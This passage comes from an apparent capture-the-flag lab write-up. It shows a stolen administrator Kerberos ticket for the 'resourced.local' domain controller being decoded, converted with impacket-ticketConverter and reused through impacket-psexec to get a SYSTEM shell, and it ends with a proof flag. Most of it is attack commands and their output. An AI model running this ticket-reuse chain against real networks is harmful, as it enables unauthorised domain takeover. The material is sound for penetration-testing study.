UxMTEzMTQxMDI5WqYRGA8yMDI1MTExNDAwMTAyOVqnERgPMjAyNTExMjAxNDEwMjlaqBEbD1JFU09VUkNFRC5MT0NBTKktMCugAwIBAqEkMCIbBGNpZnMbGnJlc291cmNlZGMucmVzb3VyY2VkLmxvY2Fs
[+] Ticket successfully imported!
```

Viewing the catched ticket provides us with the information that we do have an correct ticket for the administrator & for cifs, so we could technically psexec, but it doesn't actually work locally.

We need to take this base64 code and copy it to our machine and try to create an ticket locally & use it remotely.

```
C:\Users\L.Livingstone\Documents> klist

Current LogonId is 0:0x1a0209

Cached Tickets: (1)

#0> Client: administrator @ RESOURCED.LOCAL
 Server: cifs/resourcedc.resourced.local @ RESOURCED.LOCAL
 KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
 Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
 Start Time: 11/13/2025 6:10:29 (local)
 End Time:   11/13/2025 16:10:29 (local)
 Renew Time: 11/20/2025 6:10:29 (local)
 Session Key Type: AES-128-CTS-HMAC-SHA1-96
 Cache Flags: 0
 Kdc Called:
```

Save the ticket in an ticket.b64 file locally & base64 decode it afterwards and save it in an .kirbi file.


```
nano ticket.b64
cat ticket.b64 | base64 -d > ticket.kirbi
```

We now have to utilize "impacket-ticketConverter" to convert the .kirbi ticket to an .ccache file.
So we can use it remotely on linux.

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

We now need to export the ticket to the Kerberos variable

```
export KRB5CCNAME='pwd'/ticket.ccache
```

Now we should be able to connect remotly as Administrator using psexec


```
impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.246.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file IRSDnlTj.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service YKQL on resourcedc.resourced.local.....
[*] Starting service YKQL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Retrieved proof.txt in C:\Users\Administrator\Destop

```
4b1bbd38084f8e5495b299009a5bb5a4
```
